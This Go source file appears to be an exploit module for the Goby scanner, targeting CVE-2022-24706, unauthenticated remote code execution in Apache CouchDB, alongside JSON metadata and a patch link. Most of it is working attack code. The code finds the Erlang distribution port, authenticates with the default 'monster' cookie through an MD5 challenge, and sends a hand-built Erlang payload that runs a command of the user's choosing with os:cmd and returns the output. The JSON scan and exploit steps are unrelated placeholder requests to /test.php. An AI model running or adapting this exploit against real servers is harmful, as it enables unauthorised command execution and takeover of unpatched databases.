package exploits

import (
	"bytes"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/big"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache CouchDB Unauthenticated Remote Code Execution Vulnerability (CVE-2022-24706)",
    "Description": "<p>Apache CouchDB is a document-oriented database system developed by the Apache Foundation using Erlang.</p><p>An access control error vulnerability existed prior to Apache CouchDB 3.2.2 that stemmed from the ability of an attacker to access an incorrect default installation and gain administrator privileges without authenticating.</p>",
    "Product": "Apache CouchDB",
    "Homepage": "https://couchdb.apache.org/",
    "DisclosureDate": "2022-04-26",
    "Author": "sharecast.net@gmail.com",
    "FofaQuery": "banner=\"name couchdb at\"",
    "GobyQuery": "banner=\"name couchdb at\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://lists.apache.org/thread/w24wo0h8nlctfps65txvk0oc5hdcnv00\">https://lists.apache.org/thread/w24wo0h8nlctfps65txvk0oc5hdcnv00</a></p>",
    "References": [
        "https://www.exploit-db.com/exploits/50914"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2022-24706"
    ],
    "CNNVD": [
        "CNNVD-202204-4386"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Apache CouchDB 未认证远程代码执行漏洞 (CVE-2022-24706)",
            "Product": "Apache CouchDB",
            "Description": "<p>Apache CouchDB是美国阿帕奇（Apache）基金会的使用Erlang开发的一套面向文档的数据库系统。</p><p>Apache CouchDB 3.2.2 之前存在访问控制错误漏洞，该漏洞源于攻击者可以在不进行身份验证的情况下访问不正确的默认安装并获得管理员权限。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</p><p><a href=\"https://lists.apache.org/thread/w24wo0h8nlctfps65txvk0oc5hdcnv00\">https://lists.apache.org/thread/w24wo0h8nlctfps65txvk0oc5hdcnv00</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Apache CouchDB Unauthenticated Remote Code Execution Vulnerability (CVE-2022-24706)",
            "Product": "Apache CouchDB",
            "Description": "<p>Apache CouchDB is a document-oriented database system developed by the Apache Foundation using Erlang.</p><p>An access control error vulnerability existed prior to Apache CouchDB 3.2.2 that stemmed from the ability of an attacker to access an incorrect default installation and gain administrator privileges without authenticating.</p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://lists.apache.org/thread/w24wo0h8nlctfps65txvk0oc5hdcnv00\">https://lists.apache.org/thread/w24wo0h8nlctfps65txvk0oc5hdcnv00</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10770"
}`

	genCouchDBCmddsjald := func(cmd string) []byte {
		part1Payload := "836804610667770e414141414141404141414141414100000003000000000077007703726578"
		part2Payload := "83680267770e41414141414140414141414141410000000300000000006805770463616c6c77026f737703636d646c000000016b"
		cmdLen := fmt.Sprintf("%04x", len(cmd))
		cmdHex := hex.EncodeToString([]byte(cmd))
		part3Payload := "6a770475736572"
		payloadHex := "70" + part1Payload + part2Payload + cmdLen + cmdHex + part3Payload
		payload, _ := hex.DecodeString(payloadHex)
		payloadHexLen := fmt.Sprintf("%08x", len(payload))
		payloadall := payloadHexLen + payloadHex
		payloadHex = strings.ToUpper(payloadall)
		payload1, _ := hex.DecodeString(payloadall)
		return payload1
	}

	genEPortskdsakjs := func(host string) string {
		buf := make([]byte, 1024)
		epmName, _ := hex.DecodeString("00016e")
		conn, err := httpclient.GetTCPConn(host, time.Second*20)
		if err != nil {
			return "error"
		}
		defer conn.Close()

		for {
			conn.Write(epmName)
			conn.Read(buf)

			recvStrHex := hex.EncodeToString(buf)
			if strings.Contains(recvStrHex, "00001111") {
				recvStr, _ := hex.DecodeString(recvStrHex)
				regexp := regexp.MustCompile(`(?s)port\s+(\d+)\n`)
				submatch := regexp.FindAllStringSubmatch(bytes.NewBuffer(recvStr).String(), 1)
				if submatch == nil {
					return "error"
				}
				ePort := submatch[0][1]
				return ePort
			}
			break
		}
		return "error"
	}

	doCheckpkljl := func(host string) bool {
		cookie := "monster"
		nameMsg := "00156e00070003499c4141414141414041414141414141"
		challengeReply := "00157201020304"
		buf1 := make([]byte, 5)
		buf2 := make([]byte, 1024)
		buf := make([]byte, 1024)
		msgByte, _ := hex.DecodeString(nameMsg)
		conn, err := httpclient.GetTCPConn(host, time.Second*20)
		if err != nil {
			return false
		}
		defer conn.Close()

		for {
			conn.Write(msgByte)
			conn.Read(buf1)
			conn.Read(buf)

			recvStrHex := hex.EncodeToString(buf)
			tmpStr := recvStrHex[18:26]
			token := new(big.Int)
			token.SetString(tmpStr, 16)
			md5Hex := fmt.Sprintf("%x", md5.Sum([]byte(fmt.Sprintf("%s%s", cookie, token))))

			challengeStr := challengeReply + md5Hex
			challengeByte, _ := hex.DecodeString(challengeStr)
			conn.Write(challengeByte)
			conn.Read(buf2)
			if strings.Contains(hex.EncodeToString(buf2), "001161b4ae6978053f3042dd26b037a0851ba4") {
				return true
			}

			break
		}
		return false
	}

	runCmdcvcnxbcma := func(host, cmd string) string {
		cookie := "monster"
		nameMsg := "00156e00070003499c4141414141414041414141414141"
		challengeReply := "00157201020304"
		buf1 := make([]byte, 5)
		buf2 := make([]byte, 1024)
		buf5 := make([]byte, 1024)
		buf := make([]byte, 1024)
		nameMsg1, _ := hex.DecodeString(nameMsg)
		conn, err := httpclient.GetTCPConn(host, time.Second*20)
		if err != nil {
			return "error"
		}
		defer conn.Close()

		for {
			conn.Write(nameMsg1)
			conn.Read(buf1)
			conn.Read(buf)

			recvStrHex := hex.EncodeToString(buf)
			tmpStr := recvStrHex[18:26]
			token := new(big.Int)
			token.SetString(tmpStr, 16)
			md5Hex := fmt.Sprintf("%x", md5.Sum([]byte(fmt.Sprintf("%s%s", cookie, token))))

			challengeStr := challengeReply + md5Hex
			challengeByte, _ := hex.DecodeString(challengeStr)
			conn.Write(challengeByte)
			conn.Read(buf2)
			if strings.Contains(hex.EncodeToString(buf2), "001161b4ae6978053f3042dd26b037a0851ba4") {
				conn.Write(genCouchDBCmddsjald(cmd))
				conn.Read(buf5)
				cmdResult := strings.Split(hex.EncodeToString(buf5[48:]), "0a")[0]
				cmdText, _ := hex.DecodeString(cmdResult)
				return string(cmdText)
			}

			break
		}
		return "error"
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			host := fmt.Sprintf("%s:%s", u.IP, u.Port)
			ePort := genEPortskdsakjs(host)
			if ePort != "error" {
				host = fmt.Sprintf("%s:%s", u.IP, ePort)
				return doCheckpkljl(host)
			}

			return false

		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			host := fmt.Sprintf("%s:%s", expResult.HostInfo.IP, expResult.HostInfo.Port)
			cmd := ss.Params["cmd"].(string)
			ePort := genEPortskdsakjs(host)
			if ePort != "error" {
				host = fmt.Sprintf("%s:%s", expResult.HostInfo.IP, ePort)
				cmdResult := runCmdcvcnxbcma(host, cmd)
				if cmdResult != "error" {
					expResult.Success = true
					expResult.Output = cmdResult
				}
			}

			return expResult
		},
	))
}
